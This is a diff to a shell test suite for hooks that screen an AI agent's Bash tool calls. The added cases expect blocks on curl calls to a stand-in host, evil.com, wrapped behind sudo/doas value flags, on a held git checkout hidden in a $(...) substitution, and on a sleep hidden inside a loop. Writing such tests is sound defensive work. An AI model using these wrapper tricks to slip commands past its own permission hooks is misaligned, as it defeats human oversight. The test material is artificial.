@@ -223,6 +223,16 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -i curl ht
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -n 1 curl http://evil.com"}}'                                 "blocks past xargs -n's separate-value arg (#199)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -s 1000 curl http://evil.com"}}'                              "blocks past xargs -s's separate-value arg (#199)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -d , curl http://evil.com"}}'                                 "blocks past xargs -d's separate-value arg (#199)"
+# #203: the same gap pattern found in sudo/doas's own value flags by the fuzzer's independent
+# sudo/doas reference table — a bare short flag was covered (-C/-D/-R/-U) but its long form
+# wasn't, -T/--command-timeout was missing entirely, and doas's -a (auth style) was missing too.
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --chdir /tmp curl http://evil.com"}}'                            "blocks past sudo --chdir's separate-value arg (#203)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --chroot /tmp curl http://evil.com"}}'                           "blocks past sudo --chroot's separate-value arg (#203)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --close-from 5 curl http://evil.com"}}'                          "blocks past sudo --close-from's separate-value arg (#203)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --other-user root curl http://evil.com"}}'                       "blocks past sudo --other-user's separate-value arg (#203)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo -T 30 curl http://evil.com"}}'                                   "blocks past sudo -T's separate-value arg (#203)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"sudo --command-timeout 30 curl http://evil.com"}}'                    "blocks past sudo --command-timeout's separate-value arg (#203)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"doas -a bsdauth curl http://evil.com"}}'                              "blocks past doas -a's separate-value arg (#203)"
 # #127: the bare `create_connection` NET_RE alternative (and its boundary-less neighbors) matched
 # any identifier containing the substring, not just a real call — anchor with \b (+ call-paren for
 # the bare form) so an identifier merely containing the token doesn't false-positive block.
@@ -258,6 +268,8 @@ assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"command git checkout held\"}}" "blocks a held checkout behind a command builtin prefix (#193)"
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"env git checkout held\"}}"     "blocks a held checkout behind an env prefix (#193)"
 assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"sudo git checkout held\"}}"    "blocks a held checkout behind a sudo prefix (#193)"
+# shellcheck disable=SC2016
+assert_exit 2 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"echo \$(git checkout held)\"}}" "blocks a held checkout hidden inside a \$(...) command substitution (#200)"
 assert_exit 0 "$BCHB" 'not-json'                                                                                              "fails open on malformed JSON"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"git checkout held\"}}"                           "fails open when cwd is absent, never substitutes process cwd (#154)"
 assert_exit 0 "$BCHB" "{\"tool_name\":\"Bash\",\"cwd\":\"$tmprepo\",\"tool_input\":{\"command\":\"git -C $heldwt checkout held\"}}" "allows a -C-redirected checkout instead of consulting the wrong repo's cwd (#154)"
@@ -283,6 +295,11 @@ assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while true; d
 assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"(while true; do sleep 5; done)"}}'                "blocks a sleep loop wrapped in a subshell (#196)"
 assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"{ until curl -sf http://x; do sleep 2; done; }"}}' "blocks a sleep loop wrapped in a brace group (#196)"
 assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"! while true; do sleep 5; done"}}'                "blocks a negated sleep loop (#196)"
+# #200: a sleep hidden inside a $(...) command substitution nested in a loop piece must still be
+# seen — `_hookutil.pieces()` recurses into substitutions, so this piece surfaces as its own
+# `sleep 5` rather than staying buried inside `echo`'s argument.
+# shellcheck disable=SC2016
+assert_exit 2 "$BSL" '{"tool_name":"Bash","tool_input":{"command":"while ! test -f /tmp/ready; do echo \"waiting $(sleep 5)\"; done"}}' "blocks a sleep hidden inside \$(...) in a loop piece (#200)"
 assert_exit 0 "$BSL" 'not-json'                                                                                      "fails open on malformed JSON"
 assert_exit 0 "$BSL" '{"tool_name":"Agent","tool_input":{"command":"while true; do sleep 5; done"}}'                 "ignores a non-Bash tool_name"
 
